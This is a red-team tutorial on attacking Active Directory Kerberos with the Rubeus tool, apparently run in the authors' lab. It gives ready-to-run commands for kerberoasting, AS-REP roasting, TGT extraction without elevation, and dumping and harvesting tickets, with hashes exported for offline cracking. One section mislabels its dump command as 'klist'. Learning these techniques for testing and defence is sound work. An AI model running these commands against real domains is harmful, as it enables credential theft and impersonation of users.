# Messing with Kerberos using Rubeus

# What is Rubeus?

Rubeus is a toolset for interacting with Kerberos and abusing it written in C# which is regularly updated. Github Repo: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus). You will have to compile it yourself in VS, but it is easy as downloading it, opening the solution, right clicking and hitting build.  

# Basic Commands

### Hashing your password for further use

If you'd like interact with kerberos using a password will have to generate an hash of your password using the following command: `Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled.png)

Most of the time you won't need an AES or DES hash type, we will be using the rc4_hmac one.

### Asking for a TGT

Asking for a TGT using Rubeus is really really simple: `Rubeus.exe asktgt /user:X /rc4:x`, you can also specify `/domain:` otherwise it will use the domain you are currently signed in

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%201.png)

Using `/outfile:` you can save the raw tgt in a file

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%202.png)

### Asking for a TGS

So before requesting a TGS we will need a TGT. We can use the **tgtdeleg** feature which allows you to extract a usable TGT .kirbi from the current user without elevation on the system.

- `Rubeus.exe tgtdeleg /nowrap`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%203.png)

Next we will use asktgs feature to request a TGS for the service we want using the following command

- `Rubeus.exe asktgs /ticket:base64blob /service:SPN`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%204.png)

---

# Performing Attacks

### Kerberoasting

Performing kerberoasting attacks using Rubeus is super simple: `Rubeus.exe kerberoast`, this will get TGS' for every kerberoastable service account. Before running that command you can check the amount of kerberostable users using `Rubeus.exe kerberoast /stats`. Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking. Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene. (source: [https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/](https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/))

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%205.png)

In my case there are is 1 kerberostable service acccount. You can perform the attack by running  `Rubeus.exe kerberoast` 

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%206.png)

You can also save them in a file crackable by hashcat using `/outfile:` 

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%207.png)

### Asreproasting

AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in Harmj0y’s post here ([https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)), so I’ll focus on summarizing it. Pre-authentication is the first step in Kerberos authentication, and is designed to prevent brute-force password guessing attacks. (Source: [https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/))

You can create an asreproastable account by checking the Do not require Kerberos preauthentication check.

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%208.png)

Performing this attack using Rubeus is also very simple: `Rubeus.exe asreproast`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%209.png)

In my case, I had 2 asreproastable accounts, asrep and asrep2. You can export them using outfile argument into hashcat for cracking.

### Constrained Delegation

If a user or computer account has a service principal name (SPN) set in its msds-allowedToDelegateto field and an attacker can compromise said user/computer’s account hash, that attacker can pretend to be ANY domain user to ANY service on the targeted host.

**We will be writing a separate post on s4u since it is a more complex topic.**

# Ticket extraction and harvesting

A cool feature of Rubeus is the ability to extract and harvest tickets.

### Triaging tickets

You can triage tickets on the system using `Rubeus triage`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%2010.png)

### Viewing loaded tickets

You can view loaded tickets using Windows' built in command `klist`. Rubeus has it's own `klist` alternative: `Rubeus klist`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%2011.png)

### Dumping Tickets

Dumping tickets using rubeus can be done using the dump command: `Rubeus klist`

![Untitled](Messing%20with%20Kerberos%20using%20Rubeus/Untitled%2012.png)

If you are in an elevated shell you can dump tickets for all users

### Monitoring and Harvesting Tickets

Monitor new TGTs: `Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]`, this will check every X seconds for new tgts and list them

Harvest new TGTs: `Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]` this will monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200)

# Credits

Wrote by Enox  and d4rckh

Reference: 

- [https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
- [http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/](http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/)

Join Red Team Lounge Discord Server if you'd like to discuss more about kerberos abuse: [discord.gg/redteaming](https://discord.gg/redteaming).
